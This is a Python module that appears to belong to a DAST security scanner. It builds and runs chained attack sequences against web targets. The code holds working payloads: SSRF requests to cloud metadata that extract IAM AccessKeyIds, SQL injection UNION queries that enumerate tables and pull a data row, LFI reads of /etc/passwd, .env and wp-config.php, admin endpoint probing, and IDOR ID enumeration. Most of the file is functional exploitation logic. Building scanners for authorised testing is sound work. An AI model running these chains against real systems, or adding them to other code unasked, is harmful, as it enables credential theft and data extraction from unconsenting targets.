"""
Multi-step attack orchestrator for DAST scanner.

Chains multiple requests to exploit complex vulnerabilities that require
sequential steps. Each attack sequence builds on findings from previous
steps to demonstrate full exploitation paths.

SAFETY CONSTRAINTS:
  - Max 5 steps per sequence
  - Max 20 requests per sequence
  - No write operations (only GET + benign POST probes)
  - No data modification payloads (DELETE, PUT with destructive body, etc.)
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Vuln-type normalisation — fuzzer emits fine-grained subtypes; map them to
# the canonical keys that build_sequences() dispatches on.
# ---------------------------------------------------------------------------
_VULN_NORM: dict[str, str] = {
    "sqli_error":      "sqli",
    "sqli_blind_time": "sqli",
    "sqli_bool_true":  "sqli",
    "sqli_bool_false": "sqli",
    "xss_reflected":   "xss",
    "xss_stored":      "stored_xss",
}

# ---------------------------------------------------------------------------
# Safety constants
# ---------------------------------------------------------------------------
MAX_STEPS_PER_SEQUENCE = 5
MAX_REQUESTS_PER_SEQUENCE = 20
SAFE_METHODS = ("GET", "POST", "HEAD", "OPTIONS")

# ---------------------------------------------------------------------------
# Internal targets for SSRF probing
# ---------------------------------------------------------------------------
CLOUD_METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

INTERNAL_PORT_PROBES = [
    ("127.0.0.1", 80),
    ("127.0.0.1", 443),
    ("127.0.0.1", 8080),
    ("127.0.0.1", 8443),
    ("127.0.0.1", 3000),
    ("127.0.0.1", 5000),
    ("127.0.0.1", 9200),  # Elasticsearch
    ("127.0.0.1", 6379),  # Redis
]

# ---------------------------------------------------------------------------
# LFI target files
# ---------------------------------------------------------------------------
LFI_CONFIG_FILES = [
    "/etc/passwd",
    "../../.env",
    "../../config.php",
    "../../settings.py",
    "../../web.xml",
    "../../application.properties",
    "../../config/database.yml",
    "../../wp-config.php",
]

# ---------------------------------------------------------------------------
# Admin endpoint probes
# ---------------------------------------------------------------------------
ADMIN_ENDPOINTS = [
    "/admin",
    "/admin/",
    "/dashboard",
    "/dashboard/",
    "/api/admin/users",
    "/api/admin/config",
    "/api/admin/settings",
    "/api/v1/admin",
    "/manage",
    "/management",
]


# ===================================================================
# Data classes
# ===================================================================

@dataclass
class AttackStep:
    """A single step within a multi-step attack sequence."""

    step_no: int
    description: str
    request_template: dict  # keys: url, method, headers, body, payload_field
    success_condition: str  # regex pattern or status code string e.g. "200"
    extract_field: Optional[str] = None  # regex to pull data from response
    extracted_value: Optional[str] = None  # populated after execution


@dataclass
class AttackSequence:
    """An ordered chain of AttackSteps forming a complete exploit path."""

    sequence_id: str
    name: str  # e.g. "SSRF -> Cloud Metadata Extraction"
    category: str  # privilege_escalation | data_extraction | auth_bypass | chained_exploit
    steps: list[AttackStep] = field(default_factory=list)
    max_steps: int = MAX_STEPS_PER_SEQUENCE
    completed: bool = False
    result_summary: str = ""


# ===================================================================
# Orchestrator
# ===================================================================

class AttackOrchestrator:
    """
    Builds and executes multi-step attack sequences based on initial
    vulnerability findings. Each sequence chains requests together,
    passing extracted data from one step into the next.
    """

    def __init__(self, session: requests.Session, timeout: int = 10) -> None:
        self.session = session
        self.timeout = timeout

    # ---------------------------------------------------------------
    # Public API
    # ---------------------------------------------------------------

    def build_sequences(self, findings: list[dict]) -> list[AttackSequence]:
        """
        Analyse existing findings and construct multi-step attack
        sequences that could demonstrate deeper exploitation.

        Each finding dict is expected to have at least:
          - vuln_type: str  (e.g. "ssrf", "sqli", "xss", "lfi", "idor", "auth_bypass")
          - url: str        (the vulnerable URL)
          - param: str      (vulnerable parameter name, if applicable)
          - method: str     (HTTP method used, default GET)
          - evidence: str   (optional, any payload/proof already gathered)
        """
        sequences: list[AttackSequence] = []
        seen_types: set[str] = set()

        for finding in findings:
            vuln = _VULN_NORM.get(finding.get("vuln_type", "").lower(),
                                  finding.get("vuln_type", "").lower())
            url = finding.get("url", "")
            param = finding.get("param", "")
            method = finding.get("method", "GET").upper()
            evidence = finding.get("evidence", "")

            if not url:
                continue

            # 1. SSRF -> Internal Enumeration
            if vuln == "ssrf" and "ssrf" not in seen_types:
                seen_types.add("ssrf")
                seq = self._build_ssrf_sequence(url, param, method)
                if seq:
                    sequences.append(seq)

            # 2. SQLi -> Data Extraction
            if vuln == "sqli" and "sqli" not in seen_types:
                seen_types.add("sqli")
                seq = self._build_sqli_sequence(url, param, method, evidence)
                if seq:
                    sequences.append(seq)

            # 3. Auth Bypass -> Admin Discovery
            if vuln == "auth_bypass" and "auth_bypass" not in seen_types:
                seen_types.add("auth_bypass")
                seq = self._build_auth_bypass_sequence(url)
                if seq:
                    sequences.append(seq)

            # 4. XSS -> Session Token Probe
            if vuln in ("xss", "stored_xss") and "xss" not in seen_types:
                seen_types.add("xss")
                seq = self._build_xss_cookie_sequence(url)
                if seq:
                    sequences.append(seq)

            # 5. LFI -> Source Code Read
            if vuln == "lfi" and "lfi" not in seen_types:
                seen_types.add("lfi")
                seq = self._build_lfi_sequence(url, param, method)
                if seq:
                    sequences.append(seq)

            # 6. IDOR -> Privilege Enumeration
            if vuln == "idor" and "idor" not in seen_types:
                seen_types.add("idor")
                seq = self._build_idor_sequence(url, param, method, evidence)
                if seq:
                    sequences.append(seq)

        logger.info("Built %d attack sequences from %d findings", len(sequences), len(findings))
        return sequences

    def execute_sequence(self, seq: AttackSequence) -> AttackSequence:
        """
        Execute all steps in a sequence, passing extracted data forward.

        Stops early if:
          - A step fails its success_condition
          - The request count exceeds MAX_REQUESTS_PER_SEQUENCE
          - The step count exceeds max_steps
        """
        request_count = 0
        last_extracted: Optional[str] = None
        completed_steps: list[str] = []

        for step in seq.steps[: seq.max_steps]:
            if request_count >= MAX_REQUESTS_PER_SEQUENCE:
                logger.warning(
                    "Sequence %s hit request limit (%d)", seq.sequence_id, MAX_REQUESTS_PER_SEQUENCE
                )
                seq.result_summary = (
                    f"Stopped at step {step.step_no}: request limit reached. "
                    f"Completed: {', '.join(completed_steps) or 'none'}"
                )
                return seq

            # Inject previous extracted value into the request template
            req = self._prepare_request(step, last_extracted)
            if req is None:
                seq.result_summary = (
                    f"Stopped at step {step.step_no}: failed to build request. "
                    f"Completed: {', '.join(completed_steps) or 'none'}"
                )
                return seq

            # Safety: reject unsafe methods
            if req["method"] not in SAFE_METHODS:
                logger.warning(
                    "Sequence %s step %d uses unsafe method %s — skipping",
                    seq.sequence_id, step.step_no, req["method"],
                )
                seq.result_summary = f"Stopped at step {step.step_no}: unsafe HTTP method blocked."
                return seq

            # Send the request
            try:
                resp = self._send_request(req)
                request_count += 1
            except requests.RequestException as exc:
                logger.debug(
                    "Sequence %s step %d request failed: %s",
                    seq.sequence_id, step.step_no, exc,
                )
                seq.result_summary = (
                    f"Stopped at step {step.step_no}: request error ({exc}). "
                    f"Completed: {', '.join(completed_steps) or 'none'}"
                )
                return seq

            # Check success condition
            if not self._check_success(resp, step.success_condition):
                seq.result_summary = (
                    f"Stopped at step {step.step_no}: success condition not met "
                    f"(expected {step.success_condition!r}, got status {resp.status_code}). "
                    f"Completed: {', '.join(completed_steps) or 'none'}"
                )
                return seq

            # Extract data for next step
            if step.extract_field:
                extracted = self._extract_from_response(resp, step.extract_field)
                step.extracted_value = extracted
                last_extracted = extracted

            completed_steps.append(f"step {step.step_no}")
            logger.info(
                "Sequence %s step %d succeeded: %s",
                seq.sequence_id, step.step_no, step.description,
            )

        seq.completed = True
        seq.result_summary = (
            f"All {len(completed_steps)} steps completed successfully. "
            f"Total requests: {request_count}."
        )
        return seq

    def execute_all(self, findings: list[dict]) -> list[AttackSequence]:
        """Build sequences from findings and execute each one."""
        sequences = self.build_sequences(findings)
        results: list[AttackSequence] = []
        for seq in sequences:
            logger.info("Executing sequence: %s (%s)", seq.name, seq.sequence_id)
            executed = self.execute_sequence(seq)
            results.append(executed)
        return results

    # ---------------------------------------------------------------
    # Sequence builders (private)
    # ---------------------------------------------------------------

    def _build_ssrf_sequence(
        self, url: str, param: str, method: str
    ) -> Optional[AttackSequence]:
        """SSRF -> probe cloud metadata then internal ports."""
        steps: list[AttackStep] = []
        step_no = 1

        # Step 1: probe AWS metadata
        steps.append(
            AttackStep(
                step_no=step_no,
                description="Probe AWS instance metadata via SSRF",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {param: CLOUD_METADATA_URLS[0]} if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=r"(iam[\w\-/]+)",
            )
        )
        step_no += 1

        # Step 2: probe IAM credentials path (uses extracted value)
        steps.append(
            AttackStep(
                step_no=step_no,
                description="Retrieve IAM role credentials from metadata",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {param: "http://169.254.169.254/latest/meta-data/{extracted}"} if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition=r"AccessKeyId",
                extract_field=r'"AccessKeyId"\s*:\s*"([^"]+)"',
            )
        )
        step_no += 1

        # Step 3: probe an internal port
        host, port = INTERNAL_PORT_PROBES[0]
        internal_url = f"http://{host}:{port}/"
        steps.append(
            AttackStep(
                step_no=step_no,
                description=f"Probe internal service at {host}:{port}",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {param: internal_url} if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=r"<title>([^<]+)</title>",
            )
        )

        return AttackSequence(
            sequence_id="ssrf-metadata-enum",
            name="SSRF -> Cloud Metadata Extraction",
            category="data_extraction",
            steps=steps,
        )

    def _build_sqli_sequence(
        self, url: str, param: str, method: str, evidence: str
    ) -> Optional[AttackSequence]:
        """SQLi -> UNION column enumeration -> table listing -> sample row."""
        steps: list[AttackStep] = []

        # Step 1: determine column count with ORDER BY
        steps.append(
            AttackStep(
                step_no=1,
                description="Enumerate column count via ORDER BY",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {param: "' ORDER BY 1--"} if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=None,
            )
        )

        # Step 2: UNION SELECT to confirm injectable columns
        steps.append(
            AttackStep(
                step_no=2,
                description="Confirm UNION SELECT with NULL columns",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {param: "' UNION SELECT NULL,NULL,NULL--"} if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=None,
            )
        )

        # Step 3: enumerate tables from information_schema
        steps.append(
            AttackStep(
                step_no=3,
                description="Extract table names from information_schema",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {
                        param: (
                            "' UNION SELECT table_name,NULL,NULL "
                            "FROM information_schema.tables "
                            "WHERE table_schema=database() LIMIT 1--"
                        )
                    } if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=r"([a-zA-Z_][a-zA-Z0-9_]{2,30})",
            )
        )

        # Step 4: extract column names for discovered table
        steps.append(
            AttackStep(
                step_no=4,
                description="Extract column names from discovered table",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {
                        param: (
                            "' UNION SELECT column_name,NULL,NULL "
                            "FROM information_schema.columns "
                            "WHERE table_name='{extracted}' LIMIT 1--"
                        )
                    } if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=r"([a-zA-Z_][a-zA-Z0-9_]{2,30})",
            )
        )

        # Step 5: extract a single sample row (LIMIT 1 — read-only)
        steps.append(
            AttackStep(
                step_no=5,
                description="Extract sample data row (LIMIT 1, read-only)",
                request_template={
                    "url": url,
                    "method": method,
                    "headers": {},
                    "body": {
                        param: "' UNION SELECT {extracted},NULL,NULL FROM {prev_table} LIMIT 1--"
                    } if method == "POST" else {},
                    "payload_field": param,
                },
                success_condition="200",
                extract_field=r"(.+)",
            )
        )

        return AttackSequence(
            sequence_id="sqli-data-extract",
            name="SQLi -> Data Extraction",
            category="data_extraction",
            steps=steps,
        )

    def _build_auth_bypass_sequence(self, url: str) -> Optional[AttackSequence]:
        """Auth Bypass -> probe admin endpoints."""
        from urllib.parse import urljoin

        steps: list[AttackStep] = []
        step_no = 1

        for endpoint in ADMIN_ENDPOINTS[:MAX_STEPS_PER_SEQUENCE]:
            target = urljoin(url, endpoint)
            steps.append(
                AttackStep(
                    step_no=step_no,
                    description=f"Probe admin endpoint: {endpoint}",
                    request_template={
                        "url": target,
                        "method": "GET",
                        "headers": {},
                        "body": {},
                        "payload_field": "",
                    },
                    success_condition=r"[23]\d\d",
                    extract_field=r"<title>([^<]+)</title>",
                )
            )
            step_no += 1

        return AttackSequence(
            sequence_id="auth-bypass-admin",
            name="Auth Bypass -> Admin Discovery",
            category="privilege_escalation",
            steps=steps,
        )

    def _build_xss_cookie_sequence(self, url: str) -> Optional[AttackSequence]:
        """XSS -> verify HttpOnly flag on session cookies."""
        steps: list[AttackStep] = []

        # Step 1: fetch the page and inspect Set-Cookie headers
        steps.append(
            AttackStep(
                step_no=1,
                description="Fetch target page to inspect Set-Cookie headers",
                request_template={
                    "url": url,
                    "method": "GET",
                    "headers": {},
                    "body": {},
                    "payload_field": "",
                },
                success_condition="200",
                extract_field=r"(?i)(set-cookie:\s*[^\r\n]+)",
            )
        )

        # Step 2: check login endpoint cookies
        from urllib.parse import urljoin

        login_url = urljoin(url, "/login")
        steps.append(
            AttackStep(
                step_no=2,
                description="Fetch login endpoint to inspect session cookie flags",
                request_template={
                    "url": login_url,
                    "method": "GET",
                    "headers": {},
                    "body": {},
                    "payload_field": "",
                },
                success_condition=r"[23]\d\d",
                extract_field=r"(?i)(set-cookie:\s*[^\r\n]+)",
            )
        )

        # Step 3: verify HttpOnly absence
        steps.append(
            AttackStep(
                step_no=3,
                description="Verify HttpOnly flag is missing on session cookies",
                request_template={
                    "url": url,
                    "method": "GET",
                    "headers": {},
                    "body": {},
                    "payload_field": "",
                },
                success_condition="200",
                extract_field=r"(?i)session[^;]*(?!.*httponly)",
            )
        )

        return AttackSequence(
            sequence_id="xss-cookie-probe",
            name="XSS -> Session Token Probe",
            category="chained_exploit",
            steps=steps,
        )

    def _build_lfi_sequence(
        self, url: str, param: str, method: str
    ) -> Optional[AttackSequence]:
        """LFI -> attempt to read config files."""
        steps: list[AttackStep] = []
        step_no = 1

        for config_path in LFI_CONFIG_FILES[:MAX_STEPS_PER_SEQUENCE]:
            steps.append(
                AttackStep(
                    step_no=step_no,
                    description=f"Attempt to read {config_path} via LFI",
                    request_template={
                        "url": url,
                        "method": method,
                        "headers": {},
                        "body": {param: config_path} if method == "POST" else {},
                        "payload_field": param,
                    },
                    success_condition=r"(?:root:|DB_|database|SECRET|password|<web-app)",
                    extract_field=r"([\s\S]{1,500})",
                )
            )
            step_no += 1

        return AttackSequence(
            sequence_id="lfi-source-read",
            name="LFI -> Source Code Read",
            category="data_extraction",
            steps=steps,
        )

    def _build_idor_sequence(
        self, url: str, param: str, method: str, evidence: str
    ) -> Optional[AttackSequence]:
        """IDOR -> enumerate adjacent IDs to map exposure scope."""
        steps: list[AttackStep] = []

        # Try to find the base ID from evidence or URL
        base_id = self._extract_base_id(url, evidence)
        if base_id is None:
            base_id = 1

        for offset in range(MAX_STEPS_PER_SEQUENCE):
            target_id = base_id + offset
            steps.append(
                AttackStep(
                    step_no=offset + 1,
                    description=f"Enumerate resource with ID {target_id}",
                    request_template={
                        "url": url,
                        "method": method,
                        "headers": {},
                        "body": {param: str(target_id)} if method == "POST" else {},
                        "payload_field": param,
                    },
                    success_condition="200",
                    extract_field=r"(?:\"id\"|\"email\"|\"username\"|\"name\")\s*:\s*\"?([^\"}\s,]+)",
                )
            )

        return AttackSequence(
            sequence_id="idor-priv-enum",
            name="IDOR -> Privilege Enumeration",
            category="privilege_escalation",
            steps=steps,
        )

    # ---------------------------------------------------------------
    # Request handling (private)
    # ---------------------------------------------------------------

    def _prepare_request(
        self, step: AttackStep, last_extracted: Optional[str]
    ) -> Optional[dict]:
        """
        Build a concrete request dict from the step template.
        Substitutes ``{extracted}`` placeholders with the value
        extracted from the previous step.
        """
        template = step.request_template
        url = template.get("url", "")
        method = template.get("method", "GET").upper()
        headers = dict(template.get("headers", {}))
        body = dict(template.get("body", {}))
        payload_field = template.get("payload_field", "")

        # Inject extracted value into URL
        if last_extracted and "{extracted}" in url:
            url = url.replace("{extracted}", last_extracted)

        # Inject into body values
        for key in body:
            if isinstance(body[key], str) and "{extracted}" in body[key]:
                if last_extracted:
                    body[key] = body[key].replace("{extracted}", last_extracted)
                else:
                    body[key] = body[key].replace("{extracted}", "")

        # For GET requests, inject payload into query string
        params = {}
        if method == "GET" and payload_field and body.get(payload_field):
            params[payload_field] = body.pop(payload_field)
        elif method == "GET" and payload_field:
            # Build params from payload_field in body
            for key, val in list(body.items()):
                params[key] = val
            body = {}

        return {
            "url": url,
            "method": method,
            "headers": headers,
            "body": body if method in ("POST",) else None,
            "params": params if params else None,
        }

    def _send_request(self, req: dict) -> requests.Response:
        """Send a single HTTP request through the shared session."""
        return self.session.request(
            method=req["method"],
            url=req["url"],
            headers=req.get("headers"),
            data=req.get("body"),
            params=req.get("params"),
            timeout=self.timeout,
            verify=False,
            allow_redirects=False,
        )

    def _check_success(self, resp: requests.Response, condition: str) -> bool:
        """
        Evaluate whether a response meets the step's success condition.

        The condition can be:
          - A status code string like "200" or regex like "[23]\\d\\d"
          - A regex pattern to match against the response body
        """
        # Try as status code match first
        if re.fullmatch(r"\d{3}", condition):
            return resp.status_code == int(condition)

        # Try as status code regex
        if re.fullmatch(r"[\[\]0-9\\d{}()|]+", condition):
            if re.fullmatch(condition, str(resp.status_code)):
                return True

        # Search response body
        body = resp.text or ""
        if re.search(condition, body, re.IGNORECASE):
            return True

        # Also check response headers (useful for Set-Cookie checks)
        header_blob = "\r\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        if re.search(condition, header_blob, re.IGNORECASE):
            return True

        return False

    def _extract_from_response(
        self, resp: requests.Response, pattern: str
    ) -> Optional[str]:
        """Extract first matching group from response body or headers."""
        body = resp.text or ""

        match = re.search(pattern, body, re.IGNORECASE)
        if match:
            return match.group(1) if match.lastindex else match.group(0)

        # Fallback: search headers
        header_blob = "\r\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        match = re.search(pattern, header_blob, re.IGNORECASE)
        if match:
            return match.group(1) if match.lastindex else match.group(0)

        return None

    # ---------------------------------------------------------------
    # Utilities (private)
    # ---------------------------------------------------------------

    @staticmethod
    def _extract_base_id(url: str, evidence: str) -> Optional[int]:
        """Try to extract a numeric ID from the URL or evidence string."""
        # Look in URL path segments
        match = re.search(r"/(\d+)(?:[/?#]|$)", url)
        if match:
            try:
                return int(match.group(1))
            except ValueError:
                pass

        # Look in evidence
        if evidence:
            match = re.search(r"(\d+)", evidence)
            if match:
                try:
                    return int(match.group(1))
                except ValueError:
                    pass

        return None
